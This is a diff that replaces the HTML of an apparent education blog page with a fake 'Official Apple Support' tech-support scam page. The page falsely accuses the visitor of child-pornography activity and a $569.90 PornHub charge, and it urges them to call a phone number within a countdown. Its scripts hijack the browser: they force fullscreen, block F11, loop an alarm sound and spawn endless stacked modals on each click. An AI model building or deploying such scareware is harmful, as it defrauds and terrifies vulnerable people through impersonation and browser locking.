@@ -1,11 +1,334 @@
-<html><head><meta charset="UTF-8" class="current-jKQeCJBPNPQlQOk"/><link rel="stylesheet" href="styles.css" class="container-laSZgjsQh"/><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no" class="inner-rXjlteISZHNeai"/><meta name="referrer" content="no-referrer" class="avatar-bAharFXGWvqZjh"/><style> @import url('https://fonts.googleapis.com/css2?family=Cuprum:ital,wght@0,400..700;1,400..700&display=swap'); html,body{overflow-x: hidden;} *{margin:0;padding:0;} *::-webkit-scrollbar { background-color: #6e3346; border-radius: 14px; } *::-webkit-scrollbar-thumb { background-color: #e3afa0; border-radius: 14px; border: 2px solid #6e3346; } a{text-decoration:none} p,li{text-indent: calc(30vw/var(--resizer)*100)} ol{padding-left: calc(30vw/var(--resizer)*100)} h2{text-align: center;} input{outline: none;} #close:checked ~ section {display: none !important;} input::placeholder {color: inherit;} :root { --resizer: 1440; } @media screen and (max-width:414px) { :root { --resizer: 350; } } </style><title>mindoro.shop</title>
-  <!-- Google tag (gtag.js) -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
+<!DOCTYPE html><html lang="en"><head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="cache-control" content="max-age=3600">
+    <title>Contact - Official Apple Support</title>
+    <link rel="apple-touch-icon" href="images/favicon.ico">
+    <link rel="icon" type="image/png" href="images/favicon.ico">
+    <meta name="description" content="Contact Apple support by phone or chat, set up a repair, or make a Genius Bar appointment for iPhone, iPad, Mac and more.">
+
+    <!-- Bootstrap 5 CSS -->
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="css/bootstrap-icons.css">
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="css/all.min.css">
+    <link rel="stylesheet" href="css/Base.css" type="text/css">
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-2DMKRPGVF0"></script>
 <script>
   window.dataLayer = window.dataLayer || [];
   function gtag(){dataLayer.push(arguments);}
   gtag('js', new Date());
 
-  gtag('config', 'G-0LY0HY7L01');
+  gtag('config', 'G-2DMKRPGVF0');
 </script>
-</head><body class="wrap-bevebAQl"><main class="large-JNftwlXdJZ"><div class="xl-vFrymBA"><div class="grid-mvKrxI"><div class="section-mBnnUe"><img src="./img/935fbb9609bfad7b82b7246a65f634904bd73c7b.jpg" class="image-SJeTWhpRAPfiKlW"/></div></div><div class="wrapper-rPpcuLC"><div class="caption-IUqOKJ"><a href="themelist0.html" class="xs-UmHovRerGOXfeLl"><span class="userpic-DArmbvbtETAaTvzb">Open article</span></a></div><div class="aside-mKtwJsVAMNPiAvXQ"><h3 class="caption-oairMcSdxiAUyD">mindoro.shop</h3><span class="caption-jmcDnKDdNFz">Study This Skills Knowledge Literacy Teaching article explores the significance of ergonomic Innovation Reading desk designs Research in educational settings. Training Examination It discusses Certification how well-designed Writing desks promote Academic healthy posture, reduce physical strain, and enhance the overall Learning well-being of students, ultimately improving their Curriculum learning experience.</span></div></div></div><div class="huge-sCCLCCXp"><div class="avatar-xMgyEXvkLSpU"><div class="picture-BrDXvtwCbsPp"><h3 class="md-jYkhvo">Pictures gallery</h3></div></div><div class="sm-PlZMAbYlpxQUEtkq"><div class="aside-sgvXzHNbWZxkQ"><img src="./img/c8cf8d83f90780c60e70a008972d39758fde4320.jpg" class="sm-eNpytukbNGJLNaRP"/><img src="./img/16ce2a3cbb1244335b14cbcd75a928e48dfd0f78.jpg" class="xs-rIXVTrngAwwsjRH"/><img src="./img/7f6ffacc0db94df2994960f85c327a6da7aac971.jpg" class="tiny-lmIwpVySFzKVpPu"/><img src="./img/8b63165431be9e8fd6fdef53613cc35748f2f88a.jpg" class="caption-nxtLWbTIlZEZi"/><img src="./img/7adb5708ef2715c8870187ac57f05a7cc49f2145.jpg" class="desc-jqTTqJFOsHQ"/><img src="./img/9d94910516c268fd6cb5a9afa914976ece164bcd.jpg" class="button-VrVAgtDAJcy"/></div></div></div><div class="title-ZjDnACMflu"><div class="caption-QYxfYZnU"><div class="widget-zpMbaB"><div class="icon-nrPCyHq"><div class="tooltip-eguHXgyFmin"><a href="themelist1.html" class="image-hwYunSHR"><span class="wrap-hyJpFUe">Learn more</span></a></div><div class="small-VjRArYHTwKOS"><div class="control-bZpHOnCxiyxb"><div class="xs-oefGMRwTjXxzuC"><span class="preview-WFbcRjTHFFJ">2025-08-08</span></div></div><div class="container-fTmcOdOcbXehJua"><div class="md-gnPKcLDLkxS"><span class="img-eTVyNtvfHG">Michael Johnson</span></div></div></div><div class="text-ZrIBgySy"><h5 class="button-RZiBZOzBGm">The Essential Role of Libraries in Fostering Lifelong Learning</h5><div class="wrapper-IdFvzcnz"><span class="column-yOnylkTIaLwwUYtv">Literacy Certification This article Knowledge examines how various Teaching types Curriculum Learning Study of Reading libraries Research support Training lifelong learning Academic Innovation Writing and community Examination engagement through Skills diverse resources and programs.</span></div></div></div><div class="title-VKyVHlV"><div class="desc-PjZMfyqUQWg"><img src="./img/be5a21eba9f2ab86d4f5531aa7fdc6473f1e11e8.jpg" class="inner-YMyGzhJjAgCb"/></div></div></div><div class="holder-PURFciaBUqcJ"><div class="userpic-JSdZoSo"><div class="aside-cihfliNHRhi"><a href="themelist2.html" class="desc-LEZtPx"><span class="tooltip-fdeXLVFsnQXZPQ">Learn more</span></a></div><div class="col-tfoVrauhV"><div class="lg-SyHJuF"><div class="desc-isuWSkAJ"><span class="caption-WefBikW">2025-03-26</span></div></div><div class="button-bnLEKBmSvW"><div class="icon-xLcrdDodMLMWMx"><span class="all-CdQbNkRBiQftxeEY">Sarah Williams</span></div></div></div><div class="caption-kzmPmlXLoAbIOa"><h5 class="subject-sbsIiRFzBLC">Ergonomic Desks for Healthy Learning: How Proper Desk Design Enhances Student Well-Being</h5><div class="active-aiEIqFxnzq"><span class="more-cQIwzONFxqnzkv">This Training Curriculum Learning article explores the significance of ergonomic Knowledge desk design in educational settings, focusing Examination on Reading Research how proper Skills desks can improve Writing Literacy posture, reduce strain, Teaching and Innovation Academic Study Certification support overall student health and comfort.</span></div></div></div><div class="subtitle-TfgzplaI"><div class="xs-XjEqCXnKBc"><img src="./img/090b2be545b81d277941ece35d2bd471ad330c98.jpg" class="subtitle-xCeYSGzkupg"/></div></div></div><div class="column-tyiSRz"><div class="huge-EAQMxIpfMmrExz"><div class="pic-GZJQlCBHS"><a href="themelist3.html" class="headline-BQGJbc"><span class="inner-eTuvhPhS">Learn more</span></a></div><div class="page-npySbBIrgMa"><div class="caption-ceqjMc"><div class="content-pcqaLjKhIpqbaWP"><span class="section-JwlQTZNJxojFU">2024-12-26</span></div></div><div class="avatar-TbvxgMVApkJZ"><div class="avatar-JdPOOiygQrt"><span class="xl-tnlhEGaFmrVWoUd">Emily Johnson</span></div></div></div><div class="all-MCPYzBPsxu"><h5 class="tooltip-axtLfdetxZD">The Evolution of Libraries: Adapting to a Digital World</h5><div class="inner-rzYZrlPkbHivfATP"><span class="subtitle-svmNvuE">This article explores how Teaching Curriculum libraries have Writing evolved to meet Research the demands of a digital Literacy Innovation Learning age, highlighting their Training Academic Knowledge role in providing Reading Skills Certification resources and fostering Examination community engagement. Study</span></div></div></div><div class="desc-fwLEeHFTOqkWx"><div class="icon-NNWdHNbCtLAKmAUQ"><img src="./img/0519e07fee1333cef45234c84db76152c4b19ecf.jpg" class="text-EdQWpI"/></div></div></div><div class="tiny-ZVuapjQCMBKRFFG"><div class="huge-quGdXTiUPkxtyn"><div class="inner-dVHknlXtXJxbKp"><a href="themelist4.html" class="picture-kcQYOmfON"><span class="button-gUxyfVLH">Learn more</span></a></div><div class="col-YsvdHTl"><div class="xl-ItGIboz"><div class="big-bQlsHHs"><span class="page-cbNdPOO">2025-04-26</span></div></div><div class="subject-mvsKCkMdUAIEYg"><div class="row-xLELbEBFdtLYhyOe"><span class="img-jWYMDrqSwHAmtUi">Emma Rodriguez</span></div></div></div><div class="button-TwTIIj"><h5 class="lg-rLgEEWLNlmZD">The Evolution of Learning Spaces: Designing for Engagement and Collaboration</h5><div class="button-okyXSBvhMjGmV"><span class="desc-SVQcSB">Training Curriculum This Writing Innovation Certification article explores Reading how the design Knowledge Academic of Literacy Learning learning spaces is evolving Teaching Research to Study enhance student engagement, collaboration, and creativity Skills in educational Examination settings.</span></div></div></div><div class="grid-HaGaKWoJ"><div class="sidebar-kkbUqBidCjnOrdw"><img src="./img/57f358bcafd555945fcfe10005bbce4f5924b03e.jpg" class="tagline-ysSrDp"/></div></div></div><div class="tooltip-ORuOvKRy"><div class="box-AHXLJViuNFfaDUV"><div class="container-sJyNfzvVNK"><a href="themelist5.html" class="thumbnail-VVNSdfwJeT"><span class="container-RzjvANVANW">Learn more</span></a></div><div class="xs-YnqjkmHI"><div class="button-jIqKWkBi"><div class="headline-pzzyKRMQcSyQScx"><span class="content-VnZwiZFTsdXRqc">2024-12-27</span></div></div><div class="preview-PFsGwDi"><div class="holder-LTsTnXKj"><span class="img-DpNRrVT">Mia Thompson</span></div></div></div><div class="md-WorMcuwnHhFIrQ"><h5 class="current-tcTZEcRjac">Exploring the Benefits of Bilingualism in a Globalized World</h5><div class="aside-sGngjPKEvXVtDgV"><span class="aside-zFOHCnyG">Writing Learning Teaching This article Curriculum Examination Certification examines the advantages of being bilingual, including cognitive, professional, and social benefits, and Innovation Training offers insights Reading Academic Research Literacy Knowledge into language learning. Study Skills</span></div></div></div><div class="tip-jSNtSgRRlLcmvlHt"><div class="pic-HTBGEo"><img src="./img/d6be18a80a69caa0ca7594a460b6756adecdb737.jpg" class="current-tJrWIyXYEeEImg"/></div></div></div></div></div></main><footer class="avatar-KYXStcoZIVfUgjr"><div class="xl-LwNdwKkDnJ"><a href="./privacy_policy.html" class="narrow-CufQlLsmYGnI">Privacy Policy</a><a href="./terms_of_use.html" class="icon-AwuBatqOS">Terms Of Use</a><a href="./cookie_policy.html" class="more-gXZIBVARUpI">Cookies Policy</a></div></footer><input type="checkbox" id="close" class="small-xcsYQDpwHfXx"/><section class="headline-fhTWREvYixeQeA"><div class="subtitle-XqHClundXYgFn"><div class="small-iqKKmkavq"><label for="close" class="tooltip-TrdBPUIjFKLAymHE"><span class="section-zcEbUVwXRnmirB">Decline</span></label></div><div class="all-oSZMwsHH"><label for="close" class="thumbnail-cmRUklsEmTVDKBtc"><span class="small-NGDQTMUrBk">Accept all</span></label></div></div><div class="breadcrumbs-yixgYmeEXQ"><span class="big-qqOkEhwFevvsk">This website uses cookies to ensure you get the best experience on our website. By using our site you consent cookies. Learn more.</span></div></section></body></html>
+  
+
+</head>
+
+<body onclick="playSound()"  id="link">
+    <!-- Click overlay - only active when needed -->
+    <div id="clickOverlay" class="click-overlay"></div>
+
+        
+    <div class="bgimg">
+          <img src="images/bg.jpg" alt="" width="100%">
+        </div>
+
+
+    <div class="main">
+        
+        <section class="as-columns  as-columns--1up  as-banner as-banner--top">
+            <div class="row">
+                <div class="column large-12 medium-12 small-12">
+                    <div class="as-banner-content">
+                        
+                        <div class="alert-box">
+                            
+
+    <div class="spacbar">
+        <div class="d-flex justify-content-between">
+  <div><img src="images/applelogo2.png" alt="" style="width: 30px;margin-right: 5px;"> Alert</div>
+  <div><a href="#" style="font-size: 15px;">Apple Support</a></div>
+</div>
+<img src="images/arror.jpg" alt="" style="width:80px;display: block;margin: 10px auto 0;text-align: center;">
+    <div class="alert-title">Your iPhone has been locked due to suspicious activity.</div>
+    <div class="alert-texts">
+        <div class="bgblue"><strong>Transaction of $569.90 via Apple Pay for Child Pornography was found.</strong> <br>For security reasons you are prohibited from using your device.</div>
+    <div class="txstm"> <br>
+        Not you? Call <strong>Apple Support: <br><a href="tel:+1-855-657-5414">+1-855-657-5414</a></strong> to unlock your device.
+     </div>
+    <a href="tel:+1-855-657-5414" class="alert-button">Time left for unlock request: <span id="countdown">10:00</span></a>
+    
+    </div>
+</div>
+                        <div class="sectionTitle sectionTitleBlock">
+                            <h2 class="sectionTitle-heading"></h2>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </div>
+
+    <div class="notification">
+        <div class="msalogo"><img src="images/messages.svg" alt="" width="30px"> MESSAGES</div>
+<div class="cursor">now</div>
+  <div class="notification-header">Payment Successful</div>
+  <div class="notification-body">
+    Sent $569.90 via Apple Pay to Pornhub <br>Premium.
+    Not you? Call +1-855-657-5414
+  </div>
+  <img src="images/apple_pay.png" alt="Apple Pay" class="apple-pay">
+</div>
+
+    <div id="modalContainer"></div>
+
+    <!-- Main Modal -->
+    <div class="modal fade" id="appleAlertModal" tabindex="-1" aria-labelledby="appleAlertModalLabel" aria-hidden="true" style="top:-30px!important;">
+
+        <div class="modal-dialog modal-lg modal-dialog-centered-sm">
+            <div class="modal-content">
+                <div class="modal-body text-center">
+                    <div class="alert-text">
+                        Your iPhone has been locked due to illegal child pornography activity on your device. Your purchase of $569.90 for PornHub subscription via Apple ID is complete. Not You? Call Apple Support <a href="tel:+1-855-657-5414">+1-855-657-5414</a> to unlock it!
+                    </div>
+
+                    
+                    <div class="text-end gap-4 mt-3 actionbtn">
+                        <a href="tel:+1-855-657-5414" class="me-2 bg-primary">Call +1-855-657-5414</a>
+                        <a href="tel:+1-855-657-5414" class="mt-3 bg-secondary" id="okBtn">Cancel</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <audio id="clickSound" src="media/LhlCcb3bW5w3.mp3" preload="auto" loop></audio>
+
+<script>
+function playSound() {
+  const audio = document.getElementById("clickSound");
+//   audio.currentTime = 0; // restart sound if clicked again
+  audio.play();
+}
+</script>
+    <!-- Bootstrap & Popper.js -->
+    <script src="js/popper.min.js"></script>
+    <script src="js/bootstrap.min.js"></script>
+
+
+<script>
+let timeLeft = 10 * 60;
+
+const display = document.getElementById("countdown");
+
+const timer = setInterval(() => {
+  let minutes = Math.floor(timeLeft / 60);
+  let seconds = timeLeft % 60;
+
+  display.textContent = `${minutes}:${seconds.toString().padStart(2, '0')}`;
+
+  if (timeLeft <= 0) {
+    clearInterval(timer);
+    display.textContent = "Time's up!";
+  }
+
+  timeLeft--;
+}, 1000);
+</script>
+
+
+<script>
+
+
+
+    let modalCount = 0;
+    const maxModals = Infinity;
+    let fullScreenTriggered = false;
+
+    // Function to trigger full screen
+    function triggerFullScreen() {
+        const elem = document.documentElement;
+        if (!document.fullscreenElement) { // Only trigger if not already in fullscreen
+            if (elem.requestFullscreen) {
+                elem.requestFullscreen().catch(err => {
+                    console.error('Fullscreen error:', err);
+                });
+            } else if (elem.webkitRequestFullscreen) {
+                elem.webkitRequestFullscreen();
+            } else if (elem.msRequestFullscreen) {
+                elem.msRequestFullscreen();
+            }
+        }
+    }
+
+    // Function to exit fullscreen
+    function exitFullScreen() {
+        if (document.exitFullscreen) {
+            document.exitFullscreen();
+        } else if (document.webkitExitFullscreen) {
+            document.webkitExitFullscreen();
+        } else if (document.msExitFullscreen) {
+            document.msExitFullscreen();
+        }
+    }
+
+    // Function to generate random position within viewport
+    function getRandomPosition(modalWidth, modalHeight) {
+        const viewportWidth = Math.max(document.documentElement.clientWidth || 0, window.innerWidth || 0);
+        const viewportHeight = Math.max(document.documentElement.clientHeight || 0, window.innerHeight || 0);
+
+        if (modalWidth >= viewportWidth || modalHeight >= viewportHeight) {
+            return {
+                top: Math.max(0, (viewportHeight - modalHeight) / 2),
+                left: Math.max(0, (viewportWidth - modalWidth) / 2)
+            };
+        }
+
+        const maxX = viewportWidth - modalWidth;
+        const maxY = viewportHeight - modalHeight;
+
+        const randomX = Math.floor(Math.random() * (maxX + 1));
+        const randomY = Math.floor(Math.random() * (maxY + 1));
+
+        return { top: randomY, left: randomX };
+    }
+
+    // Function to create a new modal with random position
+    function createNewModal() {
+        if (modalCount >= maxModals) return null;
+
+        modalCount++;
+
+        const newModal = document.createElement('div');
+        newModal.className = 'modal fade modal-stack';
+        newModal.id = `appleAlertModal-${modalCount}`;
+        newModal.tabIndex = -1;
+        newModal.setAttribute('aria-labelledby', `appleAlertModalLabel-${modalCount}`);
+        newModal.setAttribute('aria-hidden', 'true');
+
+        newModal.innerHTML = `
+            <div class="modal-dialog modal-lg positioned">
+                <div class="modal-content" id="applealertmodeltwo">
+                    <div class="modal-body text-center">
+                        <div class="alert-text">
+                            Your iPhone has been locked due to illegal child pornography activity on your device. Your purchase of $569.90 for PornHub subscription via Apple ID is complete. Not You? Call Apple Support <a href="tel:+1-855-657-5414">+1-855-657-5414</a> to unlock it!
+                        </div>
+
+                        
+                        <div class="text-end gap-4 mt-3 actionbtn">
+                            <a href="tel:+1-855-657-5414" class="me-2 bg-primary">Call +1-855-657-5414</a>
+                            <a href="tel:+1-855-657-5414" class="mt-3 bg-secondary" id="okBtn">Cancel</a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        `;
+
+        document.getElementById('modalContainer').appendChild(newModal);
+
+        const modal = new bootstrap.Modal(newModal, {
+            backdrop: 'static',
+            keyboard: false
+        });
+
+        const modalDialog = newModal.querySelector('.modal-dialog');
+        let modalWidth, modalHeight;
+
+        modalWidth = Math.min(600, window.innerWidth * 0.9);
+        modalHeight = window.innerWidth <= 576 ? 250 : 400;
+
+        const { top, left } = getRandomPosition(modalWidth, modalHeight);
+        modalDialog.style.top = `${top}px`;
+        modalDialog.style.left = `${left}px`;
+
+        if (window.innerWidth <= 576) {
+            modalDialog.style.width = `${modalWidth}px`;
+            modalDialog.style.maxWidth = 'none';
+        }
+
+        newModal.style.zIndex = 1080 + modalCount;
+        modal.show();
+
+        // Ensure tel: link actually triggers phone call
+        newModal.querySelectorAll('.tel-link').forEach(link => {
+            link.addEventListener('click', (e) => {
+                window.location.href = link.getAttribute('href');
+            });
+        });
+
+        // return modal;
+    }
+
+    // Initialize the first modal
+    const appleAlertModal = new bootstrap.Modal(document.getElementById('appleAlertModal'), {
+        backdrop: 'static',
+        keyboard: false
+    });
+
+    document.addEventListener('DOMContentLoaded', function () {
+        appleAlertModal.show();
+    });
+
+    // Add event listener to body for fullscreen and modal creation
+    document.body.addEventListener('click', () => {
+        triggerFullScreen();
+        createNewModal();
+    });
+
+    // On ESC â†’ exit fullscreen
+    document.addEventListener("keydown", function (e) {
+        if (e.key === "Escape") {
+            exitFullScreen();
+        }
+        if (e.key === "F11" || e.keyCode === 122) {
+            e.preventDefault();
+            e.stopPropagation();
+            return false;
+        }
+    }, true);
+
+    document.addEventListener("keyup", function (e) {
+        if (e.key === "F11" || e.keyCode === 122) {
+            e.preventDefault();
+            e.stopPropagation();
+            return false;
+        }
+    }, true);
+
+    // If fullscreen exits (via ESC), next body click/activity will trigger fullscreen again
+    document.addEventListener("fullscreenchange", () => {
+        if (!document.fullscreenElement) {
+            // User exited fullscreen
+            document.body.addEventListener("click", triggerFullScreen, { once: true });
+        }
+    });
+
+    window.addEventListener('resize', function () {
+        const modals = document.querySelectorAll('.modal-stack .modal-dialog.positioned');
+
+        modals.forEach(modal => {
+            const viewportHeight = window.innerHeight;
+            const modalHeight = modal.offsetHeight;
+            let { top } = getRandomPosition(modal.offsetWidth, modalHeight);
+
+            if (top + modalHeight > viewportHeight) {
+                top = Math.max(0, viewportHeight - modalHeight);
+            }
+
+            modal.style.top = `${top}px`;
+            modal.style.left = `0`;
+            modal.style.width = `100%`;
+            modal.style.maxHeight = `${viewportHeight}px`;
+            modal.style.overflow = `hidden`;
+        });
+    });
+</script> 
+
+    <script src="code.jquery.com/jquery-1.12.0.min.js"></script>
+
+
+</body></html>
